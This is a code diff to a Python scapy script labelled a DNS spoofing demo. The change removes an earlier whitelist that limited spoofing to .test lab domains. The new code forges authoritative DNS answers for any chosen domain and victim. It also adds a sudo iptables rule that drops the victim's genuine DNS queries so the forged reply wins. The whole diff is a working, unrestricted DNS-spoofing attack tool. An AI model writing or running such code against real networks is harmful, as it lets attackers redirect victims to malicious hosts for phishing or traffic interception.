@@ -1,34 +1,129 @@
-from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send
-import time
+import atexit
+import os
+import subprocess
+from typing import Optional
 
-# Whitelist is used to ensure a closed environment for safety
-WHITELIST = {
-    "lab-victim.test": "10.0.0.80 (poisoned)",
-    "insecure.test": "10.0.0.77"
-}
+from scapy.all import (
+    DNS,
+    DNSQR,
+    DNSRR,
+    IP,
+    UDP,
+    conf,
+    get_if_addr,
+    send,
+    sniff,
+)
 
-def handle_dns(packet):
-    # If a DNS packet has been recieved and it is a request (rather than a response), continue
-    if packet.haslayer(DNS) and packet[DNS].qr == 0:
-        qname = packet[DNSQR].qname.decode().strip(".")
-        print(f"[DNS] Query for {qname}")
+_dns_drop_ip: Optional[str] = None
 
-        # Check if the DNS request has been made for a whitelisted website
-        if qname in WHITELIST:
-            spoof_ip = WHITELIST[qname]
-            print(f"   [+] Spoofing → {spoof_ip}")
 
-            # Create a DNS message (from attacker to victim), that contains the new poisoned IP for the cictims required website
-            spoof = IP(dst=packet[IP].src, src=packet[IP].dst) / \
-                    UDP(dport=packet[UDP].sport, sport=53) / \
-                    DNS(id=packet[DNS].id,
-                        qr=1, aa=1, qd=packet[DNS].qd,
-                        an=DNSRR(rrname=packet[DNSQR].qname,
-                                 ttl=30, rdata=spoof_ip))
+def _select_iface(target_ip: Optional[str], provided_iface: Optional[str]) -> str:
+    """
+    Choose an interface: explicit CLI > SCAPY_IFACE env > routing decision.
+    """
+    if provided_iface:
+        return provided_iface
+    env_iface = os.environ.get("SCAPY_IFACE")
+    if env_iface:
+        return env_iface
+    if target_ip:
+        route_iface = conf.route.route(target_ip)[0]
+        if route_iface:
+            return route_iface
+    return conf.iface
 
-            send(spoof, verbose=False)
 
-def run():
-    print("[*] DNS DEMO (Educational Spoofing)")
-    print("[i] Only spoofing whitelisted test domains.")
-    sniff(filter="udp port 53", prn=handle_dns)
+def _on_dns_request(packet, target_domain: str, spoof_ip: str, victim_ip: Optional[str]):
+    # Guard against unrelated UDP traffic.
+    if not (packet.haslayer(IP) and packet.haslayer(DNSQR)):
+        return
+    if packet[DNS].qr != 0:
+        return
+    if victim_ip and packet[IP].src != victim_ip:
+        return
+
+    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".").lower()
+    if target_domain not in qname:
+        return
+
+    print(f"[DNS] Query for {qname} from {packet[IP].src} -> spoofing to {spoof_ip}")
+    response = (
+        IP(dst=packet[IP].src, src=packet[IP].dst)
+        / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
+        / DNS(
+            id=packet[DNS].id,
+            qr=1,
+            aa=1,
+            qd=packet[DNS].qd,
+            an=DNSRR(rrname=packet[DNSQR].qname, ttl=30, rdata=spoof_ip),
+        )
+    )
+    send(response, verbose=False)
+
+
+def add_iptables_dns_drop(ip_victim: str) -> None:
+    """
+    Drop the victim's DNS queries so the real server never replies faster than we do.
+    """
+    global _dns_drop_ip
+    _dns_drop_ip = ip_victim
+    subprocess.run(
+        ["sudo", "iptables", "-I", "FORWARD", "-s", ip_victim, "-p", "udp", "--dport", "53", "-j", "DROP"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
+
+def remove_iptables_dns_drop(ip_victim: Optional[str]) -> None:
+    if not ip_victim:
+        return
+    subprocess.run(
+        ["sudo", "iptables", "-D", "FORWARD", "-s", ip_victim, "-p", "udp", "--dport", "53", "-j", "DROP"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
+
+def run(
+    target_domain: str,
+    spoof_ip: Optional[str] = None,
+    victim_ip: Optional[str] = None,
+    iface: Optional[str] = None,
+) -> None:
+    """
+    DNS spoofing demo: respond to queries for target_domain with spoof_ip.
+    """
+    normalized_domain = target_domain.rstrip(".").lower()
+    chosen_iface = _select_iface(victim_ip, iface)
+    conf.iface = chosen_iface
+
+    resolved_spoof_ip = spoof_ip or get_if_addr(chosen_iface)
+    if not resolved_spoof_ip:
+        print("[!] Could not determine an IP address to spoof with. Aborting DNS demo.")
+        return
+
+    print("[*] DNS DEMO (Target-based Spoofing)")
+    print(f"[i] Listening on interface: {chosen_iface}")
+    print(f"[i] Spoofing domain: {normalized_domain} -> {resolved_spoof_ip}")
+    if victim_ip:
+        print(f"[i] Limiting spoofing to queries from {victim_ip}")
+        add_iptables_dns_drop(victim_ip)
+    else:
+        print("[!] No victim IP provided; cannot firewall legitimate DNS replies.")
+
+    bpf_filter = "udp port 53"
+    if victim_ip:
+        bpf_filter += f" and src host {victim_ip}"
+
+    try:
+        sniff(
+            filter=bpf_filter,
+            prn=lambda packet: _on_dns_request(packet, normalized_domain, resolved_spoof_ip, victim_ip),
+            iface=chosen_iface,
+        )
+    finally:
+        remove_iptables_dns_drop(victim_ip)
+
+
+atexit.register(lambda: remove_iptables_dns_drop(_dns_drop_ip))
